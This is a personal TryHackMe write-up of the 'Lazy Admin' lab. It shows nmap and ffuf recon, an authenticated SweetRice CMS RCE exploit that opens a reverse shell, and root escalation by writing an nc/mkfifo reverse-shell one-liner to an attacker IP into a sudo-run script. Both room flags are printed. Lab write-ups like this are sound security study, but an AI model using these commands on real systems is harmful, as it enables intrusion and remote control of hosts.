---
title: "Lazy Admin"
kind: writeup
tags:
  - tryhackme-rooms
  - status/done
  - writeup
  - web
  - challenege
status: "Done"
difficulty: "Easy"
date: 2026-05-02
url: "https://tryhackme.com/room/lazyadmin"
category:
  - "Challenege"
database: "TryHackMe"
area: "TryHackMe Rooms"
up: "[[TryHackMe]]"
notion-id: fbf759b927518226ac9c0146b914e308
---

# Lazy Admin

In: [[Career]] / [[TryHackMe Rooms]] / [[TryHackMe]]

## Nmap Scan

```bash
nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap_full_scan 10.49.155.207                                                                                                                 ─╯
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-02 10:16 +0530
Nmap scan report for 10.49.155.207
Host is up (0.0094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds
```

## Fuzzing Directories

```bash
╰─ ffuf -u "http://10.49.155.207/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt                                                                                    ─╯

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.155.207/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3377ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3486ms]
content                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 10ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 13ms]
:: Progress: [20481/20481] :: Job [1/1] :: 21 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```

## Fuzzing /content further

```bash
╰─ ffuf -u "http://10.49.155.207/content/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r                                                                         ─╯

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.155.207/content/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

_themes                 [Status: 200, Size: 964, Words: 64, Lines: 17, Duration: 35ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1301ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1313ms]
as                      [Status: 200, Size: 3669, Words: 144, Lines: 114, Duration: 23ms]
attachment              [Status: 200, Size: 774, Words: 52, Lines: 16, Duration: 11ms]
images                  [Status: 200, Size: 3444, Words: 181, Lines: 29, Duration: 8ms]
inc                     [Status: 200, Size: 6685, Words: 406, Lines: 45, Duration: 9ms]
js                      [Status: 200, Size: 1777, Words: 116, Lines: 21, Duration: 7ms]
:: Progress: [20481/20481] :: Job [1/1] :: 3636 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

![[attachments/TryHackMe Rooms/TryHackMe/Lazy Admin/msrdc_h687C0zvAF.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Lazy Admin/image.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Lazy Admin/image 1.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Lazy Admin/image 2.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Lazy Admin/image 3.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Lazy Admin/image 4.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Lazy Admin/image 5.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Lazy Admin/image 6.png]]

```bash
╰─ python3 exploit.py \                                                                                                                                                                  ─╯
    --target-ip 10.49.155.207 \
    --username manager \
    --password Password123 \
    --attacker-ip 192.168.158.240 \
    --port 4444 \
    --zip shell.zip
  SweetRice CMS (1.5.1) Remote Code Execution (Authenticated)
  Weekey@github

{"status":1,"statusInfo":"Login success"}
[+] Payload uploaded successfully
[+] Found payload: a1475d0bb744760fd4bc8b611492f759.php
[+] Triggering reverse shell...

```

## After Spawning the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z

stty raw -echo; fg

export TERM=xterm
	reset
```

## User Flag

```bash
www-data@THM-Chal:/home/itguy$ cd /home/itguy
www-data@THM-Chal:/home/itguy$ ls
Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
Documents  Music      Public    Videos     examples.desktop  user.txt
www-data@THM-Chal:/home/itguy$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

## Privilege Escaltion

```bash
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

- `www-data` can run `backup.pl` as root with no password
- `backup.pl` calls `/etc/copy.sh`
- `/etc/copy.sh` is a reverse shell — and it's writable by www-data

```bash
ls -la /etc/copy.sh

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.158.240 5555 >/tmp/f' > /etc/copy.sh

nc -lvnp 5555

sudo /usr/bin/perl /home/itguy/backup.pl
```

```bash
root@THM-Chal:/var/www/html/content/attachment# cd /root
root@THM-Chal:~# ls
root.txt
root@THM-Chal:~# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```
